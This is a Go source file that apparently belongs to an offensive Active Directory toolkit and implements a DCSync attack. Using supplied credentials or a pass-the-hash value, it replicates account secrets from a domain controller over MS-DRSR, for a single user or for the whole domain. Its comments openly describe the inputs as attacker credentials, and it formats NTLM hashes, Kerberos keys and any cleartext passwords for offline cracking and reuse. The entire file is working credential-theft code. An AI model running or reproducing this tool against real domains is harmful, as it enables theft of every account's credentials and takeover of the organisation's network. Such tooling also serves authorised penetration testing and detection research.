package credentials

import (
	"encoding/hex"
	"fmt"
	"strings"

	msdrsr "github.com/TheManticoreProject/Manticore/network/dcerpc/ms-protocols/ms-drsr"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
)

// DCSyncSecret holds the credential material replicated for one account,
// formatted for offline cracking / pass-the-hash reuse.
type DCSyncSecret struct {
	SAMAccountName string
	RID            uint32
	// NTLM is the impacket secretsdump line: user:rid:lmhash:nthash:::
	NTLM string
	// KerberosKeys are "user:etype:hexkey" lines (AES256/AES128/RC4).
	KerberosKeys []string
	// Cleartext is set only when reversible encryption exposed the password.
	Cleartext string
}

// DCSync replicates secrets from a domain controller over MS-DRSR (drsuapi).
// It requires an account with replication rights (DS-Replication-Get-Changes /
// -All, i.e. Domain Admins or a delegated principal).
//
// target selects what to replicate:
//   - ""  or "all"          -> the whole domain naming context (DCSyncAll)
//   - "DOMAIN\\user"        -> that account (NT4 name)
//   - "user@domain"         -> that account (UPN)
//   - "CN=...,DC=..."       -> that account (distinguished name)
//   - a bare "user"         -> resolved as domain\user using the -d domain
//
// host is the DC to replicate from; domain/username/password/hash are the
// attacker credentials (hash enables pass-the-hash).
func DCSync(host, domain, username, password, hash, target string) ([]DCSyncSecret, error) {
	creds, err := credentials.NewCredentials(domain, username, password, hash)
	if err != nil {
		return nil, fmt.Errorf("invalid credentials: %w", err)
	}

	client := msdrsr.New(host, creds)
	if err := client.Connect(); err != nil {
		return nil, fmt.Errorf("drsuapi bind failed: %w", err)
	}
	defer client.Close()

	var accounts []*msdrsr.AccountSecrets
	if target == "" || strings.EqualFold(target, "all") {
		accounts, err = client.DCSyncAll(domainToNC(domain))
		if err != nil {
			return nil, fmt.Errorf("DCSync all: %w", err)
		}
	} else {
		one, err := dcsyncOne(client, domain, target)
		if err != nil {
			return nil, err
		}
		accounts = []*msdrsr.AccountSecrets{one}
	}

	results := make([]DCSyncSecret, 0, len(accounts))
	for _, a := range accounts {
		results = append(results, formatSecret(a))
	}
	return results, nil
}

// dcsyncOne resolves a single-target selector to the right DS_NAME_FORMAT.
func dcsyncOne(client *msdrsr.Client, domain, target string) (*msdrsr.AccountSecrets, error) {
	switch {
	case strings.Contains(target, "\\"):
		return client.DCSyncByAccount(target)
	case strings.Contains(target, "@"):
		return client.DCSyncByUPN(target)
	case strings.Contains(strings.ToUpper(target), "DC="):
		return client.DCSyncByDN(target)
	default:
		return client.DCSyncByAccount(fmt.Sprintf("%s\\%s", domain, target))
	}
}

// formatSecret renders one replicated object as crackable/reusable lines.
func formatSecret(a *msdrsr.AccountSecrets) DCSyncSecret {
	name := a.SAMAccountName
	if name == "" {
		name = a.DN
	}

	lm := "aad3b435b51404eeaad3b435b51404ee"
	if a.HasLM {
		lm = hex.EncodeToString(a.LMHash[:])
	}
	nt := "31d6cfe0d16ae931b73c59d7e0c089c0"
	if a.HasNT {
		nt = hex.EncodeToString(a.NTHash[:])
	}

	s := DCSyncSecret{
		SAMAccountName: name,
		RID:            a.RID,
		NTLM:           fmt.Sprintf("%s:%d:%s:%s:::", name, a.RID, lm, nt),
		Cleartext:      a.CleartextPassword,
	}

	for _, k := range a.KerberosKeys {
		etype := kerberosEType(k.KeyType)
		if etype == "" {
			continue
		}
		s.KerberosKeys = append(s.KerberosKeys, fmt.Sprintf("%s:%s:%s", name, etype, hex.EncodeToString(k.Value)))
	}
	return s
}

// kerberosEType maps a Kerberos key type to its RFC 3961 encryption-type name.
func kerberosEType(keyType uint32) string {
	switch keyType {
	case 18:
		return "aes256-cts-hmac-sha1-96"
	case 17:
		return "aes128-cts-hmac-sha1-96"
	case 23:
		return "rc4-hmac"
	case 3:
		return "des-cbc-md5"
	default:
		return ""
	}
}

// domainToNC turns a DNS domain ("lab.local") into a naming-context DN
// ("DC=lab,DC=local"). A value that already looks like a DN is returned as-is.
func domainToNC(domain string) string {
	if strings.Contains(strings.ToUpper(domain), "DC=") {
		return domain
	}
	labels := strings.Split(domain, ".")
	parts := make([]string, 0, len(labels))
	for _, l := range labels {
		if l == "" {
			continue
		}
		parts = append(parts, "DC="+l)
	}
	return strings.Join(parts, ",")
}
